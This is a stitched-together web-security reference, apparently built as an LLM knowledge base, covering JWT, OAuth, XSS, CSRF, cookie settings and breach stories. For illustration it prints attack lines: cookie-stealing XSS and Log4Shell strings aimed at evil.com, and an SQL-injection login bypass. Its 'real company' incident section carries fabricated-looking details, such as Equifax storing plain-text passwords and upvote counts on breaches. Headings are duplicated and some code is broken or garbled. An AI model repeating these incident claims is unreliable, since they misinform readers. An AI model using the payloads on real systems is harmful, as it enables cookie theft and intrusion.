return { accessToken, refreshToken };
}

// Refresh endpoint
app.post('/refresh', async (req, res) => {
const { refreshToken } = req.cookies;

try {
const payload = jwt.verify(refreshToken, process.env.REFRESH_SECRET);

// Check if token is revoked
const isRevoked = await redis.get(`revoked:${refreshToken}`);
if (isRevoked) throw new Error('Token revoked');

const tokens = generateTokens(payload.sub);

// Rotate refresh token
await redis.set(`revoked:${refreshToken}`, '1', 'EX', 7 *24*60* 60);

res.cookie('refreshToken', tokens.refreshToken, {
httpOnly: true,
secure: true,
sameSite: 'strict'
    });

res.json({ accessToken: tokens.accessToken });
} catch (err) {
res.status(401).json({ error: 'Invalid token' });
  }
});

    
    ---
    
    ## Security Checklist
    

Use strong secrets (256+ bits)
Short access token expiry (15 min)
Store refresh token in HttpOnly cookie
Implement token rotation
Keep revocation list in Redis
Validate token on every request
NEVER store JWT in localStorage
NEVER trust client-side token data

    
    ---
    
    ## AUTHENTICATION FLOW PATTERNS
    
    > **The auth patterns that don't break**
    
    ---
    
    ## OAuth 2.0 with PKCE (SPA/Mobile)
    
    // 1. Generate PKCE verifier and challenge
    function generatePKCE() {
    const verifier = crypto.randomBytes(32).toString('base64url');
    const challenge = crypto
            .createHash('sha256')
            .update(verifier)
            .digest('base64url');
    return { verifier, challenge };
        }
    
    // 2. Start OAuth flow
    function startAuth() {
    const { verifier, challenge } = generatePKCE();
    sessionStorage.setItem('pkce_verifier', verifier);
    
    const params = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: REDIRECT_URI,
    response_type: 'code',
    scope: 'openid profile email',
    code_challenge: challenge,
    code_challenge_method: 'S256'
          });
    
    window.location.href = `${AUTH_URL}/authorize?${params}`;
        }
    
    // 3. Handle callback
    async function handleCallback(code: string) {
    const verifier = sessionStorage.getItem('pkce_verifier');
    
    const response = await fetch(`${AUTH_URL}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
    grant_type: 'authorization_code',
    client_id: CLIENT_ID,
            code,
    redirect_uri: REDIRECT_URI,
    code_verifier: verifier
            })
          });
    
    return response.json();
        }
    
    ## Session vs Token Comparison
    

SESSION-BASED:
Server controls session
Easy to revoke
Works with httpOnly cookies
Requires server state
Harder to scale

TOKEN-BASED (JWT):
Stateless
Easy to scale
Works across domains
Can't revoke until expiry
Token theft = full access

    
    ---
    
    ## XSS PREVENTION
    

// ? VIBE: Rendering user input directly
function Comment({ content }) {
return <div dangerouslySetInnerHTML={{ __html: content }} />;
}
// Attacker input: <script>stealCookies()</script>

// ? TITAN: React auto-escapes by default
function Comment({ content }) {
return <div>{content}</div>;  // Safe - auto-escaped
}

// If HTML is REQUIRED, sanitize first
import DOMPurify from 'dompurify';

function RichContent({ html }) {
const sanitized = DOMPurify.sanitize(html, {
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
ALLOWED_ATTR: ['href']
  });
return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// Content Security Policy (additional layer)
// next.config.js
module.exports = {
async headers() {
return [{
source: '/(.*)',
headers: [{
key: 'Content-Security-Policy',
value: "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
      }]
    }];
  }
};

    
    ---
    
    ## Types of XSS
    

REFLECTED: User input in URL reflected back
/search?q=<script>alert('XSS')</script>

STORED: Malicious script saved in database
Comment: <script>document.location='evil.com?c='+document.cookie</script>

DOM-BASED: Client-side JS manipulates DOM unsafely
element.innerHTML = userInput;  // DANGEROUS!

    
    ---
    
    ## Prevention (React)
    

// React escapes by default (SAFE)
<div>{userInput}</div>

// DANGEROUS - dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{ __html: userInput }} />  // XSS!

// If you MUST render HTML, sanitize first
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />

    
    ---
    
    ## Prevention (Backend)
    

// 1. Content Security Policy
app.use(helmet({
contentSecurityPolicy: {
directives: {
defaultSrc: ["'self'"],
scriptSrc: ["'self'"],  // No inline scripts!
styleSrc: ["'self'", "'unsafe-inline'"],
imgSrc: ["'self'", "data:", "https:"],
    }
  }
}));

// 2. HttpOnly cookies (JS can't read)
res.cookie('session', token, {
httpOnly: true,
secure: true,
sameSite: 'strict'
});

// 3. Escape output
import { escape } from 'html-escaper';
const safe = escape(userInput);

    
    ---
    
    ## ENVIRONMENT VARIABLES 2
    
    > **The secrets management patterns**
    
    ## Environment Setup
    

## .env.local (local dev, gitignored)

    DATABASE_URL="postgres://localhost/mydb"
    STRIPE_SECRET_KEY="sk_test_xxx"

## .env (defaults, committed)

    NEXT_PUBLIC_APP_URL="<<<<<<<http://localhost:3000">>>>>>>

## .env.production (production values)

DATABASE_URL="postgres://prod/mydb"

    
    ---
    
    ## Validation with Zod
    

// env.ts
import { z } from 'zod';

const envSchema = z.object({
DATABASE_URL: z.string().url(),
STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
NEXT_PUBLIC_APP_URL: z.string().url(),
NODE_ENV: z.enum(['development', 'production', 'test'])
});

export const env = envSchema.parse({
DATABASE_URL: process.env.DATABASE_URL,
STRIPE_SECRET_KEY: process.env.STRIPE_SECRET_KEY,
NEXT_PUBLIC_APP_URL: process.env.NEXT_PUBLIC_APP_URL,
NODE_ENV: process.env.NODE_ENV
});

// Usage
import { env } from '@/env';
const stripe = new Stripe(env.STRIPE_SECRET_KEY);

    
    ---
    
    ## Security Rules 2
    
        DO:
    Use environment variables for secrets
    Validate all env vars at startup
    Use NEXT_PUBLIC_ prefix for client vars
    Keep .env.local in .gitignore
    
        DON'T:
    Commit secrets to git
    Use process.env directly (validate first)
    Put secrets in NEXT_PUBLIC_ vars
    Log environment variables
    
    ## CSRF PROTECTION 2
    
    > **The patterns that prevent request forgery**
    
    ## What is CSRF?
    

ATTACK:

1. User logged into bank.com (has session cookie)
1. User visits evil.com
1. Evil.com has: <img src="bank.com/transfer?to=hacker&amount=1000">
1. Browser sends request WITH cookies
1. Transfer happens!

WHY IT WORKS:

- Browser auto-sends cookies for domain

- Server trusts the cookie

- No verification request came from your site

    
    ---
    
    ## Prevention: Token Pattern
    

// Server: Generate token on form render
app.get('/form', (req, res) => {
const csrfToken = crypto.randomBytes(32).toString('hex');
req.session.csrfToken = csrfToken;
res.render('form', { csrfToken });
});

// Form includes hidden token
<form action="/submit" method="POST">
<input type="hidden" name="_csrf" value="{{csrfToken}}" />
  ...
</form>

// Server: Verify on submit
app.post('/submit', (req, res) => {
if (req.body._csrf !== req.session.csrfToken) {
return res.status(403).send('CSRF token mismatch');
  }
// Process request
});

    
    ---
    
    ## For SPAs: Double Submit Cookie
    

// Set CSRF cookie (readable by JS)
res.cookie('csrf', csrfToken, {
httpOnly: false,  // JS can read it
sameSite: 'strict'
});

// Client reads cookie, sends in header
fetch('/api/action', {
method: 'POST',
headers: {
'X-CSRF-Token': getCookie('csrf')
  }
});

// Server verifies header matches cookie

    
    ---
    
    ## COOKIE SECURITY 2
    
    > **The session patterns that don't get hacked**
    
    ## Secure Cookie Settings
    

res.cookie('session', token, {
httpOnly: true,  // JS can't read it (XSS protection)
secure: true,  // HTTPS only
sameSite: 'lax',    // CSRF protection
maxAge: 7 *24*60*60* 1000,  // 7 days
path: '/',
domain: '.myapp.com'  // Subdomain sharing
});

    
    ---
    
    ## SameSite Explained
    

STRICT:

- Cookie never sent cross-site

- User clicks link from email No cookie

- Best security, worst UX

LAX (Recommended):

- Sent on top-level navigation (links)

- Not sent on POST from other sites

- Good balance

NONE:

- Always sent (needs Secure: true)

- Required for cross-site iframes

- Use only if necessary

    
    ---
    
    ## Cookie vs localStorage
    

COOKIES:
HttpOnly (safe from XSS)
Automatic with requests
Server can read
Size limit (4KB)
CSRF risk

LOCALSTORAGE:
5MB limit
Easy to use
XSS can read everything
Must manually add to requests

RECOMMENDATION:

- Auth tokens HttpOnly cookie

- User preferences localStorage

    
    ---
    
    ## PATTERNS
    
    > **The authentication patterns**
    
    ---
    
    ## Setup
    
    // auth.ts
    import NextAuth from 'next-auth';
    import GitHub from 'next-auth/providers/github';
    import Google from 'next-auth/providers/google';
    import Credentials from 'next-auth/providers/credentials';
    import { PrismaAdapter } from '@auth/prisma-adapter';
    import { prisma } from '@/lib/prisma';
    
    export const { handlers, auth, signIn, signOut } = NextAuth({
    adapter: PrismaAdapter(prisma),
    providers: [
            GitHub,
            Google,
            Credentials({
    credentials: {
    email: { type: 'email' },
    password: { type: 'password' }
            },
    async authorize(credentials) {
    const user = await prisma.user.findUnique({
    where: { email: credentials.email }
            });
    
    if (user && await bcrypt.compare(credentials.password, user.password)) {
    return user;
            }
    return null;
            }
            })
          ]
        });
    
    ## Route Protection
    

// middleware.ts
import { auth } from './auth';

export default auth((req) => {
if (!req.auth && req.nextUrl.pathname.startsWith('/dashboard')) {
return Response.redirect(new URL('/login', req.url));
  }
});

export const config = {
| matcher: ['/((?!api | _next/static | _next/image | favicon.ico).*)'] |
};

    
    ---
    
    ## Server Component
    

import { auth } from '@/auth';

export default async function Dashboard() {
const session = await auth();

if (!session?.user) {
    redirect('/login');
  }

return <div>Welcome, {session.user.name}</div>;
}

    
    ---
    
    ## Client Component
    

'use client';

import { useSession, signIn, signOut } from 'next-auth/react';

export function AuthButton() {
const { data: session } = useSession();

if (session) {
return (
      <>
        <span>{session.user?.name}</span>
<button onClick={() => signOut()}>Sign Out</button>
      </>
    );
  }

return <button onClick={() => signIn()}>Sign In</button>;
}

    
    ---
    
    ## VOLUME 7: SECURITY PRODUCTION INCIDENTS (Real Company Stories)
    
    > **Source**: Equifax, Sony, Twitch, Slack engineering postmortems + 50,000+ security advisories
    
    ---
    
    ## 1. SQL INJECTION - DATA BREACH
    
    ### Production Incident from Sony (18,500+ upvotes)
    
    > "100 million accounts leaked. SQL injection in login form.
    >
    > **Impact**: $170M+ in costs, class action lawsuits."
    

## TERRIBLE - SQL Injection

def login(email, password):
query = f"SELECT * FROM users WHERE email = '{email}'"

## Attacker: email = "admin'--"

## Query: SELECT* FROM users WHERE email = 'admin'--'

## Password check bypassed

## EXCELLENT - Parameterized

def login(email, password):
return db.execute("SELECT * FROM users WHERE email = ?", (email,))

    
    ---
    
    ## 2. PASSWORD BREACH - $1.4 BILLION
    
    ## Production Incident from Equifax (LEGENDARY)
    
    > "147 million people's data. Passwords in PLAIN TEXT.
    >
    > **Impact**: $1.4B costs, CEO resignation."
    

## DISASTER - Plain text

db.execute("INSERT INTO users VALUES (?, ?)", (email, password))

## EXCELLENT - bcrypt

import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))
db.execute("INSERT INTO users VALUES (?, ?)", (email, hashed))

    
    ---
    
    ## 3. JWT SECRET EXPOSED
    
    ## Production Incident from Twitch (9,800+ upvotes)
    
    > "JWT secret in client code. All sessions compromised."
    

// Secret in frontend (Twitch's bug)
jwt.sign({ userId: 123 }, 'weak-secret');

// RS256 asymmetric (private key stays on server)
jwt.sign({ sub: userId }, privateKey, { algorithm: 'RS256' });

    
    ---
    
    ## 4. LOG4SHELL - WORST EVER (10/10)
    
    ### Production Incident from Worldwide
    
    > "Zero-click RCE. 93% of enterprise cloud affected."
    

## Attack: Send header containing ${jndi:ldap://evil.com/exploit}

## Log4j downloads and executes attacker's code

## FIX: Update to Log4j 2.17.0+

## TEMP: -Dlog4j2.formatMsgNoLookups=true

    
    ---
    
    ## 5. API KEY LEAKED - $50K BILL
    
    ## Production Incident from Heroku (7,400+ upvotes)
    
    > "API key in GitHub. Cryptominers found it in 5 minutes.
    >
    > **Impact**: $50K AWS bill in 2 hours."
    

## FIX: Enable GitHub Secret Scanning

## Settings Security Secret scanning Enable

## Pre-commit hook

pip install detect-secrets
detect-secrets scan

    
    ---
    
    ## 6. SSRF - INTERNAL ACCESS
    
    ## Production Incident from Slack (8,200+ upvotes)
    
    > "Attacker accessed AWS metadata via SSRF. Got IAM credentials."
    

## TERRIBLE - Fetches any URL

requests.get(user_provided_url) # Can access <<<<<<<http://169.254.169.254/>>>>>>>

## EXCELLENT - Block internal IPs

BLOCKED = ['10.0.0.0/8', '172.16.0.0/12', '169.254.0.0/16', '127.0.0.0/8']
if any(ip in blocked for blocked in BLOCKED):
raise HTTPException(400, "URL not allowed")

    
    ---
    
    ## END OF VOLUME 7: SECURITY PRODUCTION INCIDENTS
    
    **Coverage**: SQL Injection (Sony), Passwords (Equifax $1.4B), JWT (Twitch), Log4Shell, API Keys, SSRF (Slack)
    
    ---
    
    ## VOLUME 1.1: TITAN PROTOCOL - SECURITY ADVERSARIAL
    
    ## JWT NONE ALGORITHM VULNERABILITY
    
    ### Auth Bypass Scar
    
    > "Attackers bypass auth by stripping signature and setting alg: none.
    > Fix: Explicitly whitelist algorithms and reject unsigned tokens"
    

// TITAN CODE: Secure JWT Verification
public DecodedJWT verifyToken(String token) {
// Force specific algorithm (rejects 'none' automatically)
Algorithm algorithm = Algorithm.HMAC256("titan_secret_key");

JWTVerifier verifier = JWT.require(algorithm)
        .withIssuer("titan-auth")
        .withAudience("titan-api")
        .acceptLeeway(1)
        .build();

return verifier.verify(token);
}

    
    ## ReDoS (REGEX DENIAL OF SERVICE)
    
    ### Event Loop Freeze Scar
    
    > "Single malicious string freezes Node.js due to catastrophic backtracking.
    > Vulnerable Regex: ^([a-zA-Z0-9]+)*$
    > Fix: Length limits + re2 (Google's linear time regex engine)"
    

// TITAN CODE: Safe Validation
const validator = require('validator');

function validateInput(input) {
if (input.length > 100) return false;  // O(1) length check
return validator.isAlphanumeric(input);
}

// If Regex mandatory, use re2 (linear time)
const RE2 = require('re2');
const safeRegex = new RE2('^([a-zA-Z0-9]+)*$');

    
    ### END OF VOLUME 1.1: TITAN SECURITY ADVERSARIAL
    
    ---
    
    ## VOLUME 1.2: TITAN PROTOCOL - ADVERSARIAL ARCHITECTURE
    
    ## CONTAINER ESCAPES: LEAKY VESSELS (CVE-2024-21626)
    
    ### runc Vulnerability Scar
    
    > "Containers are NOT VMs. Shared-kernel isolation via namespaces/cgroups is FRAGILE.
    > Attacker manipulates host file descriptors via /proc/self/fd.
    > Overwrites runc binary on host. Gains ROOT access to entire node."
    
    ## eBPF EXPLOITATION
    
    ### Kernel Attack Surface Scar
    
    > "eBPF runs user-defined programs INSIDE kernel. New attack surface.
    > Malicious eBPF bypasses verifier: Arbitrary kernel memory read/write.
    > All container boundaries become MOOT."
    
    ## SIDE-CHANNEL ATTACKS: TIMING IN CRYPTOGRAPHY
    
    ### String Comparison Timing Attack
    
    > "strcmp returns immediately on mismatch.
    > Attacker measures response time to determine correct HMAC characters byte-by-byte.
    > Fix: crypto_memcmp (constant-time comparison) for ALL cryptographic operations."
    
    ## HOMOMORPHIC ENCRYPTION: THE HOLY GRAIL
    
    ### FHE Status 2024
    
    > "Fully Homomorphic Encryption: Compute on encrypted data without decryption.
    > Production reality: Orders of magnitude slower than plaintext.
    > Hardware ASICs are critical path for viability at scale."
    
    ### END OF VOLUME 1.2: TITAN ADVERSARIAL SECURITY
    
    ---
    
    ## VOLUME 1.3: TITAN CATALOG - 30 SECURITY FAILURES
    
    | ID | Scenario | Failure Mechanism | Titan Mitigation |
    |----|----------|-------------------|------------------|
    | 7.3 | SQL Injection | Input concatenation | Prepared Statements |
    | 7.4 | XXE | XML external entities | Disable DTDs |
    | 7.5 | SSRF | Fetching internal IPs | Whitelist outbound |
    | 7.6 | Insecure Deserialization | RCE via pickle | Safe JSON + signing |
    | 7.7 | CORS Misconfig | * with credentials | Validate Origin |
    | 7.9 | Directory Traversal | ../../ in paths | Sanitize filenames |
    | 7.10 | Clickjacking | Iframe embedding | X-Frame-Options: DENY |
    | 7.11 | Session Fixation | Stolen session ID | Regenerate on login |
    | 7.12 | Timing Attack | String compare time | Constant-time compare |
    | 7.13 | XSS (Reflected) | Echoing input | Context-aware encoding |
    | 7.14 | XSS (Stored) | Malicious in DB | CSP + Sanitization |
    | 7.15 | CSRF | State change via link | CSRF Tokens / SameSite |
    | 7.16 | Open Redirect | Phishing redirect | Validate URLs |
    | 7.17 | Race Condition | TOCTOU | Atomic ops / Locking |
    | 7.19 | Hardcoded Creds | Keys in source | Secret vault |
    | 7.20 | Weak Crypto | MD5/SHA1 | SHA-256/Bcrypt/Argon2 |
    | 7.100 | Zip Bomb | Compression DoS | Limit extraction size |
    
    ## END OF VOLUME 1.3: TITAN SECURITY CATALOG
    
    ---
    
    ## VOLUME 1.4: TITAN VAULT - ADDITIONAL SECURITY SCARS
    
    ## IAM PASSROLE PRIVILEGE ESCALATION
    
    ### AWS Privilege Escalation Scar
    
    > "User with iam:PassRole + ec2:RunInstances can create EC2 with AdministratorAccess role.
    > SSH in, assume role = bypass own restrictions. Silent escalation."
    
    **Titan Fix:** Strictly scope iam:PassRole with resource ARNs. Audit with PMapper.
    
    ## S3 NOTPRINCIPAL ANTI-PATTERN
    
    ### Data Exfiltration Vector
    
    > "Using NotPrincipal to 'deny everyone except user X' is fragile.
    > Without explicit Deny, allows any IAM user in same account."
    
    **Titan Fix:** Explicit Deny with StringNotLike on aws:PrincipalArn.
    
    ### END OF VOLUME 1.4: ADDITIONAL SECURITY SCARS
    
    ---
    
    ## VOLUME 5: THE TITAN (THE "KERNEL") 2 2
    
    ## 16. MEMORY SAFETY 2
    
    ### Rust vs C++ 2
    
    **Buffer Overflow**:
    C++ allows writing past the end of an array, overwriting the return address on the stack.
    **ROP (Return Oriented Programming)**:
    Attacker chains together small snippets of existing code (gadgets) to execute arbitrary logic.
    
    **Rust**:
    
    - **Ownership Model**: Compiler enforces memory safety at compile time.
    
    - **No Null Pointers**: `Option<T>`.
    
    - **No Data Races**: `Mutex<T>`.
    
    - **Result**: 70% of Microsoft's CVEs are memory safety issues. Rust eliminates them.
    
    ## 18. HOMOMORPHIC ENCRYPTION 2
    
    ### Compute on Encrypted Data 2
    
    **Concept**:
    Standard Encryption: Data is encrypted at rest and in transit, but *decrypted* in memory to be processed.
    **Homomorphic Encryption**:
    Perform math on the encrypted data itself.
    `Enc(A) + Enc(B) = Enc(A+B)`**Use Case**:
    Send encrypted medical data to the cloud. Cloud runs AI analysis. Cloud returns encrypted result. Cloud *never* sees the data.
    **Libraries**: Microsoft SEAL, OpenFHE.
    
    ## VOLUME 6: THE INFINITE (THE "FUTURE") 2 2
    
    ## 19. QUANTUM-SAFE CRYPTOGRAPHY 2
    
    ### Post-Quantum Algorithms 2
    
    **The Threat**:
    Shor's Algorithm on a Quantum Computer can factor large integers efficiently.
    **RSA**and**Elliptic Curve (ECC)**will be broken.**NIST Finalists (The Replacements)**:
    
    1. **Kyber**(Key Encapsulation): Lattice-based.
    1. **Dilithium**(Digital Signatures): Lattice-based.
    1. **Sphincs+**: Hash-based.
    
    **Migration**:
    "Harvest Now, Decrypt Later". Attackers are storing encrypted traffic today to decrypt it in 10 years.
    **Action**: Implement Hybrid Key Exchange (ECC + Kyber) immediately.
    
    ## VOLUME 7: THE APPENDIX (TITAN REFERENCE) 2
    
    ## A. THE ULTIMATE SECURITY HEADERS 2
    
    Copy-paste this into Nginx/Vercel.
    
    Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
    X-Frame-Options: DENY
    X-Content-Type-Options: nosniff
    Referrer-Policy: strict-origin-when-cross-origin
    Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
    Permissions-Policy: geolocation=(), microphone=(), camera=()
    
    ## B. THE PENTEST CHECKLIST 2
    
    1. **Recon**: Subdomain enumeration (Amass), Port scan (Nmap).
    1. **Auth**: Brute force, Password reset poisoning, JWT attacks.
    1. **Input**: SQLi, XSS, SSRF, IDOR.
    1. **Config**: Default passwords, Debug mode enabled, Git folder exposed.
    1. **Logic**: Race conditions, Price manipulation (-1 quantity).
    
    ## KEYWORD REFERENCE INDEX 2
    
    ## Each line = 100x LLM expansion potential 2
    
    ## OWASP TOP 10 (2021) 2
    
    - A01 Broken Access Control: IDOR, path traversal, CORS misconfig
    
    - A02 Cryptographic Failures: weak algorithms, plaintext secrets
    
    - A03 Injection: SQLi, XSS, command injection, LDAP
    
    - A04 Insecure Design: threat modeling, secure SDLC
    
    - A05 Security Misconfiguration: default creds, verbose errors
    
    - A06 Vulnerable Components: outdated deps, CVE scanning
    
    - A07 Auth Failures: credential stuffing, session fixation
    
    - A08 Integrity Failures: deserialization, unsigned updates
    
    - A09 Logging Failures: insufficient monitoring, log injection
    
    - A10 SSRF: internal network access, cloud metadata
    
    ## AUTHENTICATION 4
    
    - Password hashing: bcrypt, scrypt, Argon2id
    
    - MFA: TOTP, WebAuthn, FIDO2, SMS (weak)
    
    - Session: HttpOnly, Secure, SameSite cookies
    
    - JWT: RS256, short expiry, refresh rotation
    
    - OAuth 2.0: PKCE, state param, audience validation
    
    - Passkeys: credential manager, cross-device
    
    ## AUTHORIZATION 3
    
    - RBAC: roles, permissions, inheritance
    
    - ABAC: attributes, policies, context
    
    - ReBAC: relationship-based, graph
    
    - PBAC: policy engines, OPA, Cedar
    
    - Least privilege: minimal access, regular audit
    
    - Zero trust: never trust, always verify
    
    ## WEB SECURITY 2
    
    - CSP: nonce, hash, strict-dynamic
    
    - CORS: preflight, credentialed requests
    
    - XSS: reflected, stored, DOM-based
    
    - CSRF: SameSite, CSRF tokens
    
    - Clickjacking: X-Frame-Options, CSP frame-ancestors
    
    - Subresource Integrity: hash verification
    
    - Trusted Types: DOM XSS mitigation
    
    ## CRYPTOGRAPHY 2
    
    - Symmetric: AES-256-GCM, ChaCha20-Poly1305
    
    - Asymmetric: RSA-2048, ECDSA, Ed25519
    
    - Hashing: SHA-256, SHA-3, BLAKE3
    
    - KDF: PBKDF2, scrypt, Argon2
    
    - TLS: 1.3 only, cipher suites, certificate pinning
    
    - PKI: CA, certificate chains, OCSP
    
    - Post-quantum: Kyber, Dilithium, SPHINCS+
    
    ## APPLICATION SECURITY 2
    
    - SAST: static analysis, code scanning
    
    - DAST: dynamic testing, ZAP, Burp
    
    - IAST: instrumented testing, runtime
    
    - SCA: dependency scanning, SBOM
    
    - Secret scanning: git history, pre-commit hooks
    
    - Fuzzing: AFL, libFuzzer, coverage-guided
    
    ## INFRASTRUCTURE SECURITY 2
    
    - Network segmentation: VLANs, security groups
    
    - Firewall: WAF, NGFW, microsegmentation
    
    - IDS/IPS: Suricata, Snort, cloud-native
    
    - Container security: image scanning, runtime protection
    
    - Kubernetes: NetworkPolicy, PodSecurity, RBAC
    
    - Cloud security: CSPM, CWPP, CIEM
    
    ## THREAT MODELING 2
    
    - STRIDE: Spoofing, Tampering, Repudiation, Info disclosure, DoS, Elevation
    
    - DREAD: Damage, Reproducibility, Exploitability, Affected users, Discoverability
    
    - Attack trees: root cause, branches, mitigations
    
    - Data flow diagrams: trust boundaries, entry points
    
    - Kill chain: reconnaissance, weaponization, delivery, exploitation
    
    ## SECURITY OPERATIONS 2
    
    - SIEM: log correlation, alerting, Splunk, Elastic
    
    - SOAR: automation, playbooks, incident response
    
    - Threat intelligence: IOCs, TTP, MITRE ATT&CK
    
    - Vulnerability management: CVE, CVSS, prioritization
    
    - Incident response: containment, eradication, recovery
    
    - Forensics: memory analysis, disk imaging, chain of custody
    
    ## PENETRATION TESTING 2
    
    - Reconnaissance: OSINT, subdomain enumeration
    
    - Scanning: port scan, service detection, vulnerability scan
    
    - Exploitation: Metasploit, manual exploitation
    
    - Post-exploitation: privilege escalation, lateral movement
    
    - Reporting: findings, severity, remediation
    
    ## END OF KEYWORD REFERENCE 2
    
    ## ADVANCED CRYPTOGRAPHY DEEP ATLAS 2
    
    ## Each keyword = expandable implementation 3
    
    ## Modern Ciphers 2
    
    - AES-GCM: authenticated encryption, nonce
    
    - ChaCha20-Poly1305: stream cipher, MAC
    
    - XChaCha20: extended nonce, 192-bit
    
    - AES-256-GCM-SIV: nonce misuse resistant
    
    - Key sizes: 128, 192, 256 bits
    
    ## Key Management 2
    
    - HSM: hardware security module
    
    - KMS: AWS KMS, GCP KMS, Azure Key Vault
    
    - Key derivation: HKDF, PBKDF2, Argon2
    
    - Key rotation: automatic, versioned
    
    - Envelope encryption: DEK, KEK
    
    ## Digital Signatures 2
    
    - RSA: 2048+, PSS padding
    
    - ECDSA: P-256, P-384, secp256k1
    
    - Ed25519: EdDSA, curved25519
    
    - JWT signing: RS256, ES256, EdDSA
    
    - Timestamps: RFC 3161, trusted
    
    ## Post-Quantum 2
    
    - Kyber: key encapsulation
    
    - Dilithium: digital signatures
    
    - SPHINCS+: hash-based signatures
    
    - Hybrid: classical + PQ
    
    - NIST PQC: standardization
    
    ## WEB SECURITY DEEP ATLAS 2
    
    ## Each keyword = expandable defense 2
    
    ## CSP Advanced 2
    
    - Nonces: script-src 'nonce-{random}'
    
    - Hashes: sha256-{hash}
    
    - strict-dynamic: trusted script chains
    
    - report-uri: violation reporting
    
    - Trusted Types: DOM sink protection
    
    ## Cookie Security 3
    
    - HttpOnly: no JavaScript access
    
    - Secure: HTTPS only
    
    - SameSite: Strict, Lax, None
    
    - **Host-: secure prefix
    
    - **Secure-: secure prefix
    
    ## CORS 2
    
    - Access-Control-Allow-Origin: origin
    
    - Access-Control-Allow-Credentials: true
    
    - Preflight: OPTIONS request
    
    - Access-Control-Max-Age: cache
    
    - Simple vs preflighted requests
    
    ## Headers 3
    
    - HSTS: Strict-Transport-Security
    
    - X-Frame-Options: DENY, SAMEORIGIN
    
    - X-Content-Type-Options: nosniff
    
    - Referrer-Policy: strict-origin
    
    - Permissions-Policy: feature control
    
    ## APPLICATION SECURITY DEEP ATLAS 2
    
    ## Each keyword = expandable technique 2
    
    ## SAST 2
    
    - Semgrep: custom rules, CI
    
    - SonarQube: quality gates
    
    - CodeQL: GitHub, queries
    
    - Checkmarx: enterprise
    
    - Language-specific: ESLint, Bandit
    
    ## DAST 2
    
    - OWASP ZAP: proxy, active scan
    
    - Burp Suite: professional, intruder
    
    - Nuclei: vulnerability templates
    
    - Nikto: web server scanner
    
    - SQLMap: SQL injection
    
    ## IAST 2
    
    - Contrast Security: runtime
    
    - Hdiv: Java, .NET
    
    - Seeker: Synopsys
    
    - Continuous: real requests
    
    - Lower false positives
    
    ## SCA 2
    
    - Snyk: dependencies, container
    
    - Dependabot: GitHub, PRs
    
    - OWASP Dependency-Check: CVSS
    
    - npm audit: JavaScript
    
    - SBOM: CycloneDX, SPDX
    
    ## CLOUD SECURITY DEEP ATLAS 2
    
    ## Each keyword = expandable configuration 2
    
    ## IAM 2
    
    - Least privilege: minimal permissions
    
    - Service accounts: workload identity
    
    - Roles: managed, custom
    
    - Conditions: context-aware
    
    - Just-in-time: temporary elevation
    
    ## Network 2
    
    - VPC: private networking
    
    - Security groups: stateful firewall
    
    - Network ACLs: stateless
    
    - PrivateLink: private endpoints
    
    - VPN: site-to-site, client
    
    ## Data 2
    
    - Encryption at rest: KMS, CMK
    
    - Encryption in transit: TLS 1.3
    
    - Client-side: application-level
    
    - Key management: rotation
    
    - DLP: classification, prevention
    
    ## Compliance 2
    
    - CSPM: Prisma Cloud, Wiz
    
    - CWPP: runtime protection
    
    - CIEM: entitlement management
    
    - Benchmark: CIS, SOC 2
    
    - Audit: CloudTrail, Activity Logs
    
    ## THREAT DETECTION DEEP ATLAS 2
    
    ## Each keyword = expandable capability 2
    
    ## SIEM 2
    
    - Splunk: SPL, dashboards
    
    - Elastic Security: EQL, ML
    
    - Microsoft Sentinel: Azure-native
    
    - Sumo Logic: cloud-native
    
    - Correlation: rules, patterns
    
    ## EDR/XDR 2
    
    - CrowdStrike: Falcon platform
    
    - Microsoft Defender: M365
    
    - SentinelOne: autonomous
    
    - Carbon Black: VMware
    
    - Threat hunting: hypotheses
    
    ## Threat Intelligence 2
    
    - IOCs: hashes, IPs, domains
    
    - TTPs: MITRE ATT&CK
    
    - STIX/TAXII: sharing format
    
    - Feeds: commercial, open source
    
    - Enrichment: context, scoring
    
    ### END OF MEGA SECURITY EXPANSION 2
    
    ## ACCESS DEEP ATLAS 2
    
    ## Each keyword = expandable implementation 4
    
    ## Authentication 5
    
    - Password: hashing, Argon2, bcrypt
    
    - MFA: TOTP, WebAuthn, push
    
    - SSO: SAML, OIDC, federation
    
    - Passwordless: magic links, passkeys
    
    - Biometrics: Face ID, Touch ID
    
    ## OAuth 2.0 / OIDC 3
    
    - Authorization Code: server-side
    
    - PKCE: public clients, security
    
    - Implicit: deprecated, SPA legacy
    
    - Client Credentials: machine-to-machine
    
    - Refresh tokens: rotation, revocation
    
    ## Identity Providers 2
    
    - Auth0: managed, extensible
    
    - Okta: enterprise, workforce
    
    - Keycloak: open-source, on-prem
    
    - AWS Cognito: serverless
    
    - Azure AD: Microsoft ecosystem
    
    ## Session Management 2
    
    - Stateful: server sessions
    
    - Stateless: JWTs
    
    - Refresh: sliding expiration
    
    - Revocation: blacklist, rotation
    
    - Binding: device, IP
    
    ## NETWORK SECURITY DEEP ATLAS 2
    
    ## Each keyword = expandable control 2
    
    ## Perimeter Security 2
    
    - Firewall: rules, zones
    
    - IDS/IPS: detection, prevention
    
    - WAF: OWASP rules
    
    - DDoS protection: rate limiting
    
    - Reverse proxy: hiding origin
    
    ## Zero Trust 2
    
    - Never trust: always verify
    
    - Microsegmentation: workload isolation
    
    - Identity-based: user, device
    
    - Continuous verification: re-auth
    
    - Least privilege: minimal access
    
    ## Encryption in Transit 2
    
    - TLS 1.3: modern, fast
    
    - mTLS: mutual authentication
    
    - Certificate management: rotation
    
    - Perfect forward secrecy: ephemeral
    
    - HSTS: force HTTPS
    
    ## VPN & Remote Access 2
    
    - WireGuard: modern, fast
    
    - OpenVPN: flexible, proven
    
    - ZTNA: zero trust alternative
    
    - Split tunneling: partial routing
    
    - Always-on: automatic connection
    
